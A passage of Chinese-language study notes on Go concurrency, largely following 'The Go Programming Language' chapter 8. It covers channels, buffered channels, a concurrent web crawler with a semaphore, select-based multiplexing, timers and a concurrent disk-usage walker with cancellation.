'in' to channel 'out',// removing those divisible by 'prime'.func Filter(in &lt;-chan int, out chan&lt;- int, prime int) &#123; for &#123; i := &lt;-in // Receive value from 'in'. if i%prime != 0 &#123; out &lt;- i // Send 'i' to 'out'. &#125; &#125;&#125;// The prime sieve: Daisy-chain Filter processes.func main() &#123; ch := make(chan int) // Create a new channel. go Generate(ch) // Launch Generate goroutine. for i := 0; i &lt; 10; i++ &#123; prime := &lt;-ch fmt.Println(prime) ch1 := make(chan int) go Filter(ch, ch1, prime) ch = ch1 &#125;&#125; 单方向的Channel 随着程序的增长，人们习惯于将大的函数拆分为小的函数。我们前面的例子中使用了三个goroutine，然后用两个channels连链接它们，它们都是main函数的局部变量。将三个goroutine拆分为以下三个函数是自然的想法： func counter(out chan int) func squarer(out, in chan int) func printer(in chan int) 其中squarer计算平方的函数在两个串联Channels的中间，因此拥有两个channels类型的参数，一个用于输入一个用于输出。每个channels都用有相同的类型，但是它们的使用方式想反：一个只用于接收，另一个只用于发送。参数的名字in和out已经明确表示了这个意图，但是并无法保证squarer函数向一个in参数对应的channels发送数据或者从一个out参数对应的channels接收数据。 这种场景是典型的。当一个channel作为一个函数参数是，它一般总是被专门用于只发送或者只接收。 为了表明这种意图并防止被滥用，Go语言的类型系统提供了单方向的channel类型，分别用于只发送或只接收的channel。类型chan&lt;- int表示一个只发送int的channel，只能发送不能接收。相反，类型&lt;-chan int表示一个只接收int的channel，只能接收不能发送。（箭头&lt;-和关键字chan的相对位置表明了channel的方向。）这种限制将在编译期检测。 因为关闭操作只用于断言不再向channel发送新的数据，所以只有在发送者所在的goroutine才会调用close函数，因此对一个只接收的channel调用close将是一个编译错误。 这是改进的版本，这一次参数使用了单方向channel类型： gopl.io/ch8/pipeline3 func counter(out chan&lt;- int) { for x := 0; x &lt; 100; x++ { out &lt;- x } close(out) } func squarer(out chan&lt;- int, in &lt;-chan int) { for v := range in { out &lt;- v * v } close(out) } func printer(in &lt;-chan int) { for v := range in { fmt.Println(v) } } func main() { naturals := make(chan int) squares := make(chan int) go counter(naturals) go squarer(squares, naturals) printer(squares) } 调用counter(naturals)将导致将chan int类型的naturals隐式地转换为chan&lt;- int类型只发送型的channel。调用printer(squares)也会导致相似的隐式转换，这一次是转换为&lt;-chan int类型只接收型的channel。任何双向channel向单向channel变量的赋值操作都将导致该隐式转换。这里并没有反向转换的语法：也就是不能一个将类似chan&lt;- int类型的单向型的channel转换为chan int类型的双向型的channel。 带缓存的Channels 带缓存的Channel内部持有一个元素队列。队列的最大容量是在调用make函数创建channel时通过第二个参数指定的。下面的语句创建了一个可以持有三个字符串元素的带缓存Channel。图8.2是ch变量对应的channel的图形表示形式。 ch = make(chan string, 3) 向缓存Channel的发送操作就是向内部缓存队列的尾部插入原因，接收操作则是从队列的头部删除元素。如果内部缓存队列是满的，那么发送操作将阻塞直到因另一个goroutine执行接收操作而释放了新的队列空间。相反，如果channel是空的，接收操作将阻塞直到有另一个goroutine执行发送操作而向队列插入元素。 我们可以在无阻塞的情况下连续向新创建的channel发送三个值： ch &lt;- “A” ch &lt;- “B” ch &lt;- “C” 此刻，channel的内部缓存队列将是满的，如果有第四个发送操作将发生阻塞。 如果我们接收一个值， fmt.Println(&lt;-ch) // “A” 那么channel的缓存队列将不是满的也不是空的（图8.4），因此对该channel执行的发送或接收操作都不会发送阻塞。通过这种方式，channel的缓存队列解耦了接收和发送的goroutine。 在某些特殊情况下，程序可能需要知道channel内部缓存的容量，可以用内置的cap函数获取： fmt.Println(cap(ch)) // “3” 同样，对于内置的len函数，如果传入的是channel，那么将返回channel内部缓存队列中有效元素的个数。因为在并发程序中该信息会随着接收操作而失效，但是它对某些故障诊断和性能优化会有帮助。 fmt.Println(len(ch)) // “2” 在继续执行两次接收操作后channel内部的缓存队列将又成为空的，如果有第四个接收操作将发生阻塞： fmt.Println(&lt;-ch) // “B” fmt.Println(&lt;-ch) // “C” 在这个例子中，发送和接收操作都发生在同一个goroutine中，但是在眞是的程序中它们一般由不同的goroutine执行。Go语言新手有时候会将一个带缓存的channel当作同一个goroutine中的队列使用，虽然语法看似简单，但实际上这是一个错误。Channel和goroutine的调度器机制是紧密相连的，一个发送操作——或许是整个程序——可能会永远阻塞。如果你只是需要一个简单的队列，使用slice就可以了。 下面的例子展示了一个使用了带缓存channel的应用。它并发地向三个镜像站点发出请求，三个镜像站点分散在不同的地理位置。它们分别将收到的响应发送到带缓存channel，最后接收者只接收第一个收到的响应，也就是最快的那个响应。因此mirroredQuery函数可能在另外两个响应慢的镜像站点响应之前就返回了结果。（顺便说一下，多个goroutines并发地向同一个channel发送数据，或从同一个channel接收数据都是常见的用法。） 123456789func mirroredQuery() string &#123; responses := make(chan string, 3) go func() &#123; responses &lt;- request(&quot;asia.gopl.io&quot;) &#125;() go func() &#123; responses &lt;- request(&quot;europe.gopl.io&quot;) &#125;() go func() &#123; responses &lt;- request(&quot;americas.gopl.io&quot;) &#125;() return &lt;-responses // return the quickest response&#125;func request(hostname string) (response string) &#123; /* ... */ &#125; 如果我们使用了无缓存的channel，那么两个慢的goroutines将会因为没有人接收而被永远卡住。这种情况，称为goroutines泄漏，这将是一个BUG。和垃圾变量不同，泄漏的goroutines并不会被自动回收，因此确保每个不再需要的goroutine能正常退出是重要的。 关于无缓存或带缓存channels之间的选择，或者是带缓存channels的容量大小的选择，都可能影响程序的正确性。无缓存channel更强地保证了每个发送操作与相应的同步接收操作；但是对于带缓存channel，这些操作是解耦的。同样，卽使我们知道将要发送到一个channel的信息的数量上限，创建一个对应容量大小带缓存channel也是不现实的，因为这要求在执行任何接收操作之前缓存所有已经发送的值。如果未能分配足够的缓冲将导致程序死锁。 Channel的缓存也可能影响程序的性能。想象一家蛋糕店有三个厨师，一个烘焙，一个上糖衣，还有一个将每个蛋糕传递到它下一个厨师在生产线。在狭小的厨房空间环境，每个厨师在完成蛋糕后必须等待下一个厨师已经准备好接受它；这类似于在一个无缓存的channel上进行沟通。 如果在每个厨师之间有一个放置一个蛋糕的额外空间，那么每个厨师就可以将一个完成的蛋糕临时放在那里而马上进入下一个蛋糕在制作中；这类似于将channel的缓存队列的容量设置为1。只要每个厨师的平均工作效率相近，那么其中大部分的传输工作将是迅速的，个体之间细小的效率差异将在交接过程中弥补。如果厨师之间有更大的额外空间——也是就更大容量的缓存队列——将可以在不停止生产线的前提下消除更大的效率波动，例如一个厨师可以短暂地休息，然后在加快赶上进度而不影响其其他人。 另一方面，如果生产线的前期阶段一直快于后续阶段，那么它们之间的缓存在大部分时间都将是满的。相反，如果后续阶段比前期阶段更快，那么它们之间的缓存在大部分时间都将是空的。对于这类场景，额外的缓存并没有带来任何好处。 生产线的隐喻对于理解channels和goroutines的工作机制是很有帮助的。例如，如果第二阶段是需要精心制作的复杂操作，一个厨师可能无法跟上第一个厨师的进度，或者是无法满足第阶段厨师的需求。要解决这个问题，我们可以雇佣另一个厨师来帮助完成第二阶段的工作，他执行相同的任务但是独立工作。这类似于基于相同的channels创建另一个独立的goroutine。 123456789func bufferedChannel() &#123; c := make(chan int, 3) go worker(0, c) c &lt;- &apos;a&apos; c &lt;- &apos;b&apos; c &lt;- &apos;c&apos; c &lt;- &apos;d&apos; time.Sleep(time.Millisecond)&#125; 单爬虫 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package mainimport ( \"fmt\" \"os\" \"net/http\" \"golang.org/x/net/html\" \"log\")func breadthFirst(f func(item string) []string, worklist []string) &#123; seen := make(map[string]bool) for len(worklist) &gt; 0 &#123; items := worklist worklist = nil for _, item := range items &#123; if !seen[item] &#123; seen[item] = true worklist = append(worklist, f(item)...) &#125; &#125; &#125;&#125;//!-breadthFirst//!+crawlfunc crawl(url string) []string &#123; fmt.Println(url) list, err := Extract(url) if err != nil &#123; log.Print(err) &#125; return list&#125;//!-crawl//!+mainfunc main() &#123; // Crawl the web breadth-first, // starting from the command-line arguments. breadthFirst(crawl, os.Args[1:])&#125;//!-mainfunc Extract(url string) ([]string, error) &#123; resp, err := http.Get(url) if err != nil &#123; return nil, err &#125; if resp.StatusCode != http.StatusOK &#123; resp.Body.Close() return nil, fmt.Errorf(\"getting %s: %s\", url, resp.Status) &#125; doc, err := html.Parse(resp.Body) resp.Body.Close() if err != nil &#123; return nil, fmt.Errorf(\"parsing %s as HTML: %v\", url, err) &#125; var links []string visitNode := func(n *html.Node) &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" &#123; for _, a := range n.Attr &#123; if a.Key != \"href\" &#123; continue &#125; link, err := resp.Request.URL.Parse(a.Val) if err != nil &#123; continue // ignore bad URLs &#125; links = append(links, link.String()) &#125; &#125; &#125; forEachNode(doc, visitNode, nil) return links, nil&#125;//!-Extract// Copied from gopl.io/ch5/outline2.func forEachNode(n *html.Node, pre, post func(n *html.Node)) &#123; if pre != nil &#123; pre(n) &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; forEachNode(c, pre, post) &#125; if post != nil &#123; post(n) &#125;&#125; 并发爬虫的错误案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package mainimport ( \"fmt\" \"log\" \"os\" \"gopl.io/ch5/links\")//!+crawlfunc crawl(url string) []string &#123; fmt.Println(url) list, err := links.Extract(url) if err != nil &#123; log.Print(err) &#125; return list&#125;//!-crawl//!+mainfunc main() &#123; worklist := make(chan []string) // Start with the command-line arguments. go func() &#123; worklist &lt;- os.Args[1:] &#125;() // Crawl the web concurrently. seen := make(map[string]bool) for list := range worklist &#123; for _, link := range list &#123; if !seen[link] &#123; seen[link] = true go func(link string) &#123; worklist &lt;- crawl(link) &#125;(link) &#125; &#125; &#125;&#125;//!-main/*//!+output$ go build gopl.io/ch8/crawl1$ ./crawl1 http://gopl.io/http://gopl.io/https://golang.org/help/https://golang.org/doc/https://golang.org/blog/...2015/07/15 18:22:12 Get ...: dial tcp: lookup blog.golang.org: no such host2015/07/15 18:22:12 Get ...: dial tcp 23.21.222.120:443: socket: too many open files...//!-output*/ 最初的错误信息是一个让人莫名的DNS查找失败，卽使这个域名是完全可靠的。而随后的错误信息揭示了原因：这个程序一次性创建了太多网络连接，超过了每一个进程的打开文件数限制，旣而导致了在调用net.Dial像DNS查找失败这样的问题。 这个程序实在是太他妈并行了。无穷无尽地并行化并不是什么好事情，因为不管怎么说，你的系统总是会有一个些限制因素，比如CPU核心数会限制你的计算负载，比如你的硬盘转轴和磁头数限制了你的本地磁盘IO操作频率，比如你的网络带宽限制了你的下载速度上限，或者是你的一个web服务的服务容量上限等等。为了解决这个问题，我们可以限制并发程序所使用的资源来使之适应自己的运行环境。对于我们的例子来说，最简单的方法就是限制对links.Extract在同一时间最多不会有超过n次调用，这里的n是fd的limit-20，一般情况下。 我们可以用一个有容量限制的buffered channel来控制并发，这类似于操作系统里的计数信号量概念。从概念上讲，channel里的n个空槽代表n个可以处理内容的token(通行证)，从channel里接收一个值会释放其中的一个token，并且生成一个新的空槽位。这样保证了在没有接收介入时最多有n个发送操作。(这里可能我们拿channel里填充的槽来做token更直观一些，不过还是这样吧~)。由于channel里的元素类型并不重要，我们用一个零值的struct{}来作为其元素。 让我们重写crawl函数，将对links.Extract的调用操作用获取、释放token的操作包裹起来，来确保同一时间对其只有20个调用。信号量数量和其能操作的IO资源数量应保持接近。 第二个问题是这个程序永远都不会终止，卽使它已经爬到了所有初始链接衍生出的链接。为了使这个程序能够终止，我们需要在worklist为空或者没有crawl的goroutine在运行时退出主循环。这个版本中，计算器n对worklist的发送操作数量进行了限制。每一次我们发现有元素需要被发送到worklist时，我们都会对n进行操作，在向worklist中发送初始的命令行参数之前，我们也进行过一次操作。这里的操作++是在每启动一个crawler的goroutine之前。主循环会在n减为0时终止，这时候说明没活可干了。 现在这个并发爬虫会比5.6节中的深度优先搜索版快上20倍，而且不会出什么错，并且在其完成任务时也会正确地终止。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( \"fmt\" \"log\" \"os\" \"gopl.io/ch5/links\")//!+sema// tokens is a counting semaphore used to// enforce a limit of 20 concurrent requests.var tokens = make(chan struct&#123;&#125;, 20)func crawl(url string) []string &#123; fmt.Println(url) tokens &lt;- struct&#123;&#125;&#123;&#125; // acquire a token list, err := links.Extract(url) &lt;-tokens // release the token if err != nil &#123; log.Print(err) &#125; return list&#125;//!-sema//!+func main() &#123; worklist := make(chan []string) var n int // number of pending sends to worklist // Start with the command-line arguments. n++ go func() &#123; worklist &lt;- os.Args[1:] &#125;() // Crawl the web concurrently. seen := make(map[string]bool) for ; n &gt; 0; n-- &#123; list := &lt;-worklist for _, link := range list &#123; if !seen[link] &#123; seen[link] = true n++ go func(link string) &#123; worklist &lt;- crawl(link) &#125;(link) &#125; &#125; &#125;&#125; 下面的程序是避免过度并发的另一种思路。这个版本使用了原来的crawl函数，但没有使用计数信号量，取而代之用了20个长活的crawler goroutine，这样来保证最多20个HTTP请求在并发。 123456789101112131415161718192021222324252627282930func main() &#123; worklist := make(chan []string) // lists of URLs, may have duplicates unseenLinks := make(chan string) // de-duplicated URLs // Add command-line arguments to worklist. go func() &#123; worklist &lt;- os.Args[1:] &#125;() // Create 20 crawler goroutines to fetch each unseen link. for i := 0; i &lt; 20; i++ &#123; go func() &#123; for link := range unseenLinks &#123; foundLinks := crawl(link) go func() &#123; worklist &lt;- foundLinks &#125;() &#125; &#125;() &#125; // The main goroutine de-duplicates worklist items // and sends the unseen ones to the crawlers. seen := make(map[string]bool) for list := range worklist &#123; for _, link := range list &#123; if !seen[link] &#123; seen[link] = true unseenLinks &lt;- link &#125; &#125; &#125;&#125; 所有的爬虫goroutine现在都是被同一个channel-unseenLinks喂饱的了。主goroutine负责拆分它从worklist里拿到的元素，然后把没有抓过的经由unseenLinks channel发送给一个爬虫的goroutine。 seen这个map被限定在main goroutine中；也就是说这个map只能在main goroutine中进行访问。类似于其它的信息隐藏方式，这样的约束可以让我们从一定程度上保证程序的正确性。例如，内部变量不能够在函数外部被访问到；变量在没有被转义的情况下是无法在函数外部访问的；一个对象的封装字段无法被该对象的方法以外的方法访问到。在所有的情况下，信息隐藏都可以帮助我们约束我们的程序，使其不发生意料之外的情况。 crawl函数爬到的链接在一个专有的goroutine中被发送到worklist中来避免死锁。为了节省空间，这个例子的终止问题我们先不进行详细阐述了。 基于select的多路复用 下面的程序会进行火箭发射的倒计时。time.Tick函数返回一个channel，程序会周期性地像一个节拍器一样向这个channel发送事件。每一个事件的值是一个时间戳，不过更有意思的是其传送方式。 123456789func main() &#123; fmt.Println(&quot;Commencing countdown.&quot;) tick := time.Tick(1 * time.Second) for countdown := 10; countdown &gt; 0; countdown-- &#123; fmt.Println(countdown) j&lt;-tick &#125; launch()&#125; 现在我们让这个程序支持在倒计时中，用户按下return键时直接中断发射流程。首先，我们启动一个goroutine，这个goroutine会尝试从标准输入中调入一个单独的byte并且，如果成功了，会向名为abort的channel发送一个值。 12345abort := make(chan struct&#123;&#125;)go func() &#123; os.Stdin.Read(make([]byte, 1)) // read a single byte abort &lt;- struct&#123;&#125;&#123;&#125;&#125;() 现在每一次计数循环的迭代都需要等待两个channel中的其中一个返回事件了：ticker channel当一切正常时(就像NASA jorgon的&quot;nominal&quot;，译注：这梗估计我们是不懂了)或者异常时返回的abort事件。我们无法做到从每一个channel中接收信息，如果我们这么做的话，如果第一个channel中没有事件发过来那么程序就会立刻被阻塞，这样我们就无法收到第二个channel中发过来的事件。这时候我们需要多路复用(multiplex)这些操作了，为了能够多路复用，我们使用了select语句。 select { case &lt;-ch1: // … case x := &lt;-ch2: // …use x… case ch3 &lt;- y: // … default: // … } 上面是select语句的一般形式。和switch语句稍微有点相似，也会有几个case和最后的default选择支。每一个case代表一个通信操作(在某个channel上进行发送或者接收)并且会包含一些语句组成的一个语句块。一个接收表达式可能只包含接收表达式自身(译注：不把接收到的值赋值给变量什么的)，就像上面的第一个case，或者包含在一个简短的变量声明中，像第二个case里一样；第二种形式让你能够引用接收到的值。 select会等待case中有能够执行的case时去执行。当条件满足时，select才会去通信并执行case之后的语句；这时候其它通信是不会执行的。一个没有任何case的select语句写作select{}，会永远地等待下去。 让我们回到我们的火箭发射程序。time.After函数会立卽返回一个channel，并起一个新的goroutine在经过特定的时间后向该channel发送一个独立的值。下面的select语句会会一直等待到两个事件中的一个到达，无论是abort事件或者一个10秒经过的事件。如果10秒经过了还没有abort事件进入，那么火箭就会发射。 12345678910111213func main() &#123; // ...create abort channel... fmt.Println(&quot;Commencing countdown. Press return to abort.&quot;) select &#123; case &lt;-time.After(10 * time.Second): // Do nothing. case &lt;-abort: fmt.Println(&quot;Launch aborted!&quot;) return &#125; launch()&#125; 下面这个例子更微秒。ch这个channel的buffer大小是1，所以会交替的为空或为满，所以只有一个case可以进行下去，无论i是奇数或者偶数，它都会打印0 2 4 6 8。 12345678ch := make(chan int, 1)for i := 0; i &lt; 10; i++ &#123; select &#123; case x := &lt;-ch: fmt.Println(x) // &quot;0&quot; &quot;2&quot; &quot;4&quot; &quot;6&quot; &quot;8&quot; case ch &lt;- i: &#125;&#125; 如果多个case同时就绪时，select会随机地选择一个执行，这样来保证每一个channel都有平等的被select的机会。增加前一个例子的buffer大小会使其输出变得不确定，因为当buffer旣不为满也不为空时，select语句的执行情况就像是抛硬币的行为一样是随机的。 下面让我们的发射程序打印倒计时。这里的select语句会使每次循环迭代等待一秒来执行退出操作。 1234567891011121314151617func main() &#123; // ...create abort channel... fmt.Println(&quot;Commencing countdown. Press return to abort.&quot;) tick := time.Tick(1 * time.Second) for countdown := 10; countdown &gt; 0; countdown-- &#123; fmt.Println(countdown) select &#123; case &lt;-tick: // Do nothing. case &lt;-abort: fmt.Println(&quot;Launch aborted!&quot;) return &#125; &#125; launch()&#125; time.Tick函数表现得好像它创建了一个在循环中调用time.Sleep的goroutine，每次被唤醒时发送一个事件。当countdown函数返回时，它会停止从tick中接收事件，但是ticker这个goroutine还依然存活，继续徒劳地尝试从channel中发送值，然而这时候已经没有其它的goroutine会从该channel中接收值了–这被称为goroutine泄露(§8.4.4)。 Tick函数挺方便，但是只有当程序整个生命周期都需要这个时间时我们使用它才比较合适。否则的话，我们应该使用下面的这种模式： ticker := time.NewTicker(1 * time.Second) &lt;-ticker.C // receive from the ticker’s channel ticker.Stop() // cause the ticker’s goroutine to terminate 有时候我们希望能够从channel中发送或者接收值，并避免因为发送或者接收导致的阻塞，尤其是当channel没有准备好写或者读时。select语句就可以实现这样的功能。select会有一个default来设置当其它的操作都不能够马上被处理时程序需要执行哪些逻辑。 下面的select语句会在abort channel中有值时，从其中接收值；无值时什么都不做。这是一个非阻塞的接收操作；反复地做这样的操作叫做“轮询channel”。 1234567select &#123;case &lt;-abort: fmt.Printf(&quot;Launch aborted!\\n&quot;) returndefault: // do nothing&#125; channel的零值是nil。也许会让你觉得比较奇怪，nil的channel有时候也是有一些用处的。因为对一个nil的channel发送和接收操作会永远阻塞，在select语句中操作nil的channel永远都不会被select到。 这使得我们可以用nil来激活或者禁用case，来达成处理其它输入或输出事件时超时和取消的逻辑。我们会在下一节中看到一个例子。 select一个例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package mainimport ( \"fmt\" \"math/rand\" \"time\")func generator() chan int &#123; out := make(chan int) go func() &#123; i := 0 for &#123; time.Sleep( time.Duration(rand.Intn(1500)) * time.Millisecond) out &lt;- i i++ &#125; &#125;() return out&#125;func worker(id int, c chan int) &#123; for n := range c &#123; time.Sleep(time.Second) fmt.Printf(\"Worker %d received %d\\n\", id, n) &#125;&#125;func createWorker(id int) chan&lt;- int &#123; c := make(chan int) go worker(id, c) return c&#125;func main() &#123; var c1, c2 = generator(), generator() var worker = createWorker(0) var values []int tm := time.After(10 * time.Second) //10秒后往通道发送消息 tick := time.Tick(time.Second) //每隔一秒钟发送一次 for &#123; var activeWorker chan&lt;- int var activeValue int if len(values) &gt; 0 &#123; activeWorker = worker activeValue = values[0] &#125; select &#123; case n := &lt;-c1: values = append(values, n) case n := &lt;-c2: values = append(values, n) case activeWorker &lt;- activeValue: values = values[1:] case &lt;-time.After(800 * time.Millisecond): fmt.Println(\"timeout\") case &lt;-tick: fmt.Println( \"queue len =\", len(values)) case &lt;-tm: fmt.Println(\"bye\") return &#125; &#125;&#125; select的第二个例子： 时间+先到先得，但是只能一次 123456789101112131415func ToChansTimedTimerSelect(d time.Duration, message Type, a, b chan Type) (written int) &#123; t := time.NewTimer(d) for i := 0; i &lt; 2; i++ &#123; select &#123; case a &lt;- message: a = nil case b &lt;- message: b = nil case &lt;-t.C: return i &#125; &#125; t.Stop() return 2&#125; time.timer定时器 死锁 12345678910111213141516171819202122232425262728293031package mainimport \"time\"func toChanTimed(t *time.Timer, ch chan int) &#123; t.Reset(1 * time.Second) defer func() &#123; if !t.Stop() &#123; &lt;-t.C &#125; &#125;() select &#123; case ch &lt;- 42: case &lt;-t.C: return &#125;&#125;func main()&#123; t := time.NewTimer(time.Second) var ch chan int = make(chan int) toChanTimed(t,ch)&#125; 正确： t.reset 与t.stop()不能并发 12345678910111213141516171819202122232425262728package mainimport \"time\"func toChanTimed(t *time.Timer, ch chan int) &#123; t.Reset(1 * time.Second) select &#123; case ch &lt;- 42: case &lt;-t.C: return &#125; if !t.Stop() &#123; &lt;-t.C &#125;&#125;func main()&#123; t := time.NewTimer(time.Second) var ch chan int = make(chan int) toChanTimed(t,ch)&#125; 并发的文件遍历 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package mainimport ( \"flag\" \"fmt\" \"io/ioutil\" \"os\" \"path/filepath\")func main() &#123; // Determine the initial directories. flag.Parse() roots := flag.Args() if len(roots) == 0 &#123; roots = []string&#123;\".\"&#125; &#125; // Traverse the file tree. fileSizes := make(chan int64) go func() &#123; for _, root := range roots &#123; walkDir(root, fileSizes) &#125; close(fileSizes) &#125;() // Print the results. var nfiles, nbytes int64 for size := range fileSizes &#123; nfiles++ nbytes += size &#125; printDiskUsage(nfiles, nbytes)&#125;func printDiskUsage(nfiles, nbytes int64) &#123; fmt.Printf(\"%d files %.1f GB\\n\", nfiles, float64(nbytes)/1e9)&#125;//!-main//!+walkDir// walkDir recursively walks the file tree rooted at dir// and sends the size of each found file on fileSizes.func walkDir(dir string, fileSizes chan&lt;- int64) &#123; for _, entry := range dirents(dir) &#123; if entry.IsDir() &#123; subdir := filepath.Join(dir, entry.Name()) walkDir(subdir, fileSizes) &#125; else &#123; fileSizes &lt;- entry.Size() &#125; &#125;&#125;// dirents returns the entries of directory dir.func dirents(dir string) []os.FileInfo &#123; entries, err := ioutil.ReadDir(dir) if err != nil &#123; fmt.Fprintf(os.Stderr, \"du1: %v\\n\", err) return nil &#125; return entries&#125;//!-walkDir// The du1 variant uses two goroutines and// prints the total after every file is found. 并发的文件遍历2 借助select能够打印出过程有点意思。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package main// The du2 variant uses select and a time.Ticker// to print the totals periodically if -v is set.import ( \"flag\" \"fmt\" \"io/ioutil\" \"os\" \"path/filepath\" \"time\")//!+var verbose = flag.Bool(\"v\", false, \"show verbose progress messages\")func main() &#123; // ...start background goroutine... //!- // Determine the initial directories. flag.Parse() roots := flag.Args() if len(roots) == 0 &#123; roots = []string&#123;\".\"&#125; &#125; // Traverse the file tree. fileSizes := make(chan int64) go func() &#123; for _, root := range roots &#123; walkDir(root, fileSizes) &#125; close(fileSizes) &#125;() //!+ // Print the results periodically. var tick &lt;-chan time.Time if *verbose &#123; tick = time.Tick(500 * time.Millisecond) &#125; var nfiles, nbytes int64loop: for &#123; select &#123; case size, ok := &lt;-fileSizes: if !ok &#123; break loop // fileSizes was closed &#125; nfiles++ nbytes += size case &lt;-tick: printDiskUsage(nfiles, nbytes) &#125; &#125; printDiskUsage(nfiles, nbytes) // final totals&#125;//!-func printDiskUsage(nfiles, nbytes int64) &#123; fmt.Printf(\"%d files %.1f GB\\n\", nfiles, float64(nbytes)/1e9)&#125;// walkDir recursively walks the file tree rooted at dir// and sends the size of each found file on fileSizes.func walkDir(dir string, fileSizes chan&lt;- int64) &#123; for _, entry := range dirents(dir) &#123; if entry.IsDir() &#123; subdir := filepath.Join(dir, entry.Name()) walkDir(subdir, fileSizes) &#125; else &#123; fileSizes &lt;- entry.Size() &#125; &#125;&#125;// dirents returns the entries of directory dir.func dirents(dir string) []os.FileInfo &#123; entries, err := ioutil.ReadDir(dir) if err != nil &#123; fmt.Fprintf(os.Stderr, \"du: %v\\n\", err) return nil &#125; return entries&#125; 并发的文件遍历3 改进在：1、main函数中，每一个目录都加了goroutines。 2、信号量 3、sync.WaitGroup 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113package main// The du3 variant traverses all directories in parallel.// It uses a concurrency-limiting counting semaphore// to avoid opening too many files at once.import ( \"flag\" \"fmt\" \"io/ioutil\" \"os\" \"path/filepath\" \"sync\" \"time\")var vFlag = flag.Bool(\"v\", false, \"show verbose progress messages\")//!+func main() &#123; // ...determine roots... //!- flag.Parse() // Determine the initial directories. roots := flag.Args() if len(roots) == 0 &#123; roots = []string&#123;\".\"&#125; &#125; //!+ // Traverse each root of the file tree in parallel. fileSizes := make(chan int64) var n sync.WaitGroup for _, root := range roots &#123; n.Add(1) //sync.WaitGroup 等待协程 go walkDir(root, &amp;n, fileSizes) //协程 &#125; go func() &#123; n.Wait() close(fileSizes) &#125;() //!- // Print the results periodically. var tick &lt;-chan time.Time if *vFlag &#123; tick = time.Tick(500 * time.Millisecond) &#125; var nfiles, nbytes int64loop: for &#123; select &#123; case size, ok := &lt;-fileSizes: if !ok &#123; break loop // fileSizes was closed &#125; nfiles++ nbytes += size case &lt;-tick: printDiskUsage(nfiles, nbytes) &#125; &#125; printDiskUsage(nfiles, nbytes) // final totals //!+ // ...select loop...&#125;//!-func printDiskUsage(nfiles, nbytes int64) &#123; fmt.Printf(\"%d files %.1f GB\\n\", nfiles, float64(nbytes)/1e9)&#125;// walkDir recursively walks the file tree rooted at dir// and sends the size of each found file on fileSizes.//!+walkDirfunc walkDir(dir string, n *sync.WaitGroup, fileSizes chan&lt;- int64) &#123; defer n.Done() for _, entry := range dirents(dir) &#123; if entry.IsDir() &#123; n.Add(1) subdir := filepath.Join(dir, entry.Name()) go walkDir(subdir, n, fileSizes) &#125; else &#123; fileSizes &lt;- entry.Size() &#125; &#125;&#125;//!-walkDir//信号量//!+sema// sema is a counting semaphore for limiting concurrency in dirents.var sema = make(chan struct&#123;&#125;, 20)// dirents returns the entries of directory dir.func dirents(dir string) []os.FileInfo &#123; sema &lt;- struct&#123;&#125;&#123;&#125; // acquire token defer func() &#123; &lt;-sema &#125;() // release token // ... //!-sema entries, err := ioutil.ReadDir(dir) if err != nil &#123; fmt.Fprintf(os.Stderr, \"du: %v\\n\", err) return nil &#125; return entries&#125; 并发的退出 有时候我们需要通知goroutine停止它正在干的事情，比如一个正在执行计算的web服务，然而它的客户端已经断开了和服务端的连接。 Go语言并没有提供在一个goroutine中终止另一个goroutine的方法，由于这样会导致goroutine之间的共享变量落在未定义的状态上。在8.7节中的rocket launch程序中，我们往名字叫abort的channel里发送了一个简单的值，在countdown的goroutine中会把这个值理解为自己的退出信号。但是如果我们想要退出两个或者任意多个goroutine怎么办呢？ 一种可能的手段是向abort的channel里发送和goroutine数目一样多的事件来退出它们。如果这些goroutine中已经有一些自己退出了，那么会导致我们的channel里的事件数比goroutine还多，这样导致我们的发送直接被阻塞。另一方面，如果这些goroutine又生成了其它的goroutine，我们的channel里的数目又太少了，所以有些goroutine可能会无法接收到退出消息。一般情况下我们是很难知道在某一个时刻具体有多少个goroutine在运行着的。另外，当一个goroutine从abort channel中接收到一个值的时候，他会消费掉这个值，这样其它的goroutine就没法看到这条信息。为了能够达到我们退出goroutine的目的，我们需要更靠谱的策略，来通过一个channel把消息广播出去，这样goroutine们能够看到这条事件消息，并且在事件完成之后，可以知道这件事已经发生过了。 回忆一下我们关闭了一个channel并且被消费掉了所有已发送的值，操作channel之后的代码可以立卽被执行，并且会产生零值。我们可以将这个机制扩展一下，来作为我们的广播机制：不要向channel发送值，而是用关闭一个channel来进行广播。 只要一些小修改，我们就可以把退出逻辑加入到前一节的du程序。首先，我们创建一个退出的channel，这个channel不会向其中发送任何值，但其所在的闭包内要写明程序需要退出。我们同时还定义了一个工具函数，cancelled，这个函数在被调用的时候会轮询退出状态。 12345678910var done = make(chan struct&#123;&#125;)func cancelled() bool &#123; select &#123; case &lt;-done: return true default: return false &#125;&#125; 下面我们创建一个从标准输入流中读取内容的goroutine，这是一个比较典型的连接到终端的程序。每当有输入被读到(比如用户按了回车键)，这个goroutine就会把取消消息通过关闭done的channel广播出去。 // Cancel traversal when input is detected. go func() { os.Stdin.Read(make([]byte, 1)) // read a single byte close(done) }() 现在我们需要使我们的goroutine来对取消进行响应。在main goroutine中，我们添加了select的第三个case语句，尝试从done channel中接收内容。如果这个case被满足的话，在select到的时候卽会返回，但在结束之前我们需要把fileSizes channel中的内容“排”空，在channel被关闭之前，舍弃掉所有值。这样可以保证对walkDir的调用不要被向fileSizes发送信息阻塞住，可以正确地完成。 123456789101112for &#123; select &#123; case &lt;-done: // Drain fileSizes to allow existing goroutines to finish. for range fileSizes &#123; // Do nothing. &#125; return case size, ok := &lt;-fileSizes: // ... &#125;&#125; walkDir这个goroutine一启动就会轮询取消状态，如果取消状态被设置的话会直接返回，并且不做额外的事情。这样我们将所有在取消事件之后创建的goroutine改变为无操作。 123456789func walkDir(dir string, n *sync.WaitGroup, fileSizes 